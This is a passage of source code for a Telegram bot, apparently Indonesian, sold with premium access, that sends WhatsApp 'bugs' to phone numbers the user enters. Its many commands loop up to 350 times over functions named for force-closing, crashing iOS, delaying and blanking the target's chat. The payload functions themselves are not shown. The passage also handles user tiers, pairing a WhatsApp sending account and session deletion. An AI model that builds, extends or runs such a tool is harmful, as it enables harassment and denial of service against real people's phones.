        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `🛠 Step          : Preparing...`
      );

      const loopBug = 10;
      for (let i = 0; i < loopBug; i++) {
        await sleep(500);
        await DelayHardSwVnX(sock, target, mention = true);
        await SennUiOverload(target);
        await sleep(1000);
        await RazzxBuldozer(target);
        await sleep(1500);

        console.log(`⚔️ MULTI NUMBER BUG → ${target} | Loop ${i + 1}/${maxLoop}`);
      }

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ **MULTI BUG IN PROGRESS**\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `✅ Status        : Target selesai`
      );

      await sleep(1500);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      progressMsg.message_id,
      null,
      "✅ **MULTI BUG COMPLETED**\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `📊 Progress     : 100%\n` +
      `🔥 Status       : All target processed`
  );
});
bot.command("protocol11", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /protocol11 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /protocol11
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await RazzxBuldozer(target);  
      await sleep(1000);
    }
  })();
});

bot.command("bulldozer", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /bulldozer 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /bulldozer
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await RazzxBuldozer(target);  
      await sleep(1000);
    }
  })();
});

bot.command("xdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xdelay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xdelay
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayHardSwVnX(sock, target, mention = true);  
      await sleep(1000);
    }
  })();
});
bot.command("uiloca", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uiloca 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uiloca
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await OneTapLoca(sock, target);  
      await sleep(1000);
    }
  })();
});

bot.command("xspam", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xspam
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayInvisVnXNew(sock, target);      
      await sleep(1500);
    }
  })();
});
bot.command("xdelayv2", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

   

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xinvis 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xinvis
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayHardSwVnX(sock, target, mention = true);      
      await sleep(1000);
    }
  })();
});
bot.command("xipongdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    i
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xipongdelay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xipongdelay
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 15; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await IPhoneDelay(target, ptcp = true);      
      await sleep(1000);
    }
  })();
});
bot.command("xfcxspam", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xfcxspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xfcxspam
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 1; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await ForceCloseInvisible(sock, target);      
      await sleep(1000);
    }
  })();
});

bot.command("hoytc", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /hoytc 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /hoytc
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 45; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await ForceCloseInvisible(sock, target);      
      await sleep(1000);
    }
  })();
});

bot.command("xipongui", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xipongui 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xipongui
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await SennUiOverload(target);      
      await sleep(1000);
    }
  })();
});
bot.command("xipongforce", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xipongforce 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xipongforce
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await NewlasterFollCrashIos(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("hoycristal", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /hoycristal 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /hoycristal
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 350; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await FcHardFix(sock, target, ptcp = true);
      await sleep(1500);
    }
  })();
});
bot.command("hoymoly", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /hoymoly 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /hoymoly
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 15; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await SennClick(target);
      await sleep(15000);
    }
  })();
});
bot.command("blankclick", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankclick 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankclick
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await XProtexBlankChatV5(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("blank1msg", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blank1msg 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blank1msg
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 1; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await XProtexBlankChatV5(sock, target);
      await sleep(250);
    }
  })();
});
bot.command("blankhard", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankhard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankhard
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 200; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await XProtexBlankChatV5(sock, target);
      await sleep(2500);
    }
  })();
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand add admin ===\\\
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 8509166320"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 8509166320"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "SENNGNTG");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗛𝗮𝗽𝘂𝘀", callback_data: "Close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
// Handler untuk tombol close
bot.command("Close", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
  }

  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
    await ctx.answerCbQuery("❌ Gagal menghapus pesan!", { show_alert: true });
  }
});
///=== comand del sesi ===\\\\
bot.command("delsender", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
////////// OWNER MENU \\\\\\\\\
